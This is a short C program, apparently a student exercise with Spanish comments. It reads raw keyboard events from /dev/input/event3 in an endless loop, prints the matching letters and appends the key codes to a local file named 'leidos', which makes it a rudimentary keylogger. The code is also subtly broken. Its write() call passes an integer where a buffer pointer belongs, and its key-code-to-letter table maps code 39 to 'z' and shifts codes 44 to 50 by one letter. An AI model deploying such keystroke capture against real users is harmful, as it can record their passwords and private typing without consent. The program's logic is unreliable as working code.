/*
 *Autor Jonathan Soto Jimenez 
 */
#include <sys/file.h>
#include <stdio.h>
#include <string.h>
#include <linux/input.h>

char checar(int);

void main()
{
   struct input_event ev;
   int cadenaLeida;
   int fd = open("/dev/input/event3",O_RDONLY);
   
   if(fd == -1)
   fprintf(stderr,"No se pudo abrir o crear el archivo\n");
  
   int fdEscribir = open("./leidos",O_WRONLY|O_CREAT|O_APPEND,S_IRUSR|S_IWUSR);
   
   if(fdEscribir == -1)
   fprintf(stderr,"No se pudo abrir o crear el archivo\n");
   
   printf("Descriptor de archivo: %d\n",fd);
   
  while (1)
  {
    int fd2;
    int x;
    fd2 = read (fd,&ev, sizeof(ev));
    if (ev.code != 0)
    {
      checar(ev.code);
      fdEscribir = open("./leidos",O_WRONLY|O_CREAT|O_APPEND,S_IRUSR|S_IWUSR);
      if(write(fdEscribir,ev.code,4)==-1)
	       fprintf(stderr,"Error al escribir en el archivo.");
      close(fdEscribir);
      
    }
  }
  
}
//que onda
char checar(int a)
{
  switch(a)
  {
    case 16:
      printf("q\n");
      break;
    case 17:
      printf("w\n");
      break;
     case 18:
      printf("e\n");
      break;
    case 19:
      printf("r\n");
      break;
    case 20:
      printf("t\n");
      break;
     case 21:
      printf("y\n");
      break;
    case 22:
      printf("u\n");
      break;
    case 23:
      printf("i\n");
      break;
     case 24:
      printf("o\n");
      break;
     case 25:
      printf("p\n");
      break;
    case 30:
      printf("a\n");
      break;
    case 31:
      printf("s\n");
      break;
     case 32:
      printf("d\n");
      break;
    case 33:
      printf("f\n");
      break;
    case 34:
      printf("g\n");
      break;
     case 35:
      printf("h\n");
      break;
    case 36:
      printf("j\n");
      break;
    case 37:
      printf("k\n");
      break;
     case 38:
      printf("l\n");
      break;
     case 39:
      printf("z\n");
      break;
    case 44:
      printf("x\n");
      break;
     case 45:
      printf("c\n");
      break;
    case 46:
      printf("v\n");
      break;
    case 47:
      printf("b\n");
      break;
     case 48:
      printf("n\n");
      break;
     case 49:
      printf("m\n");
      break;
     case 50:
      printf("ñ\n");
      break;
  }
}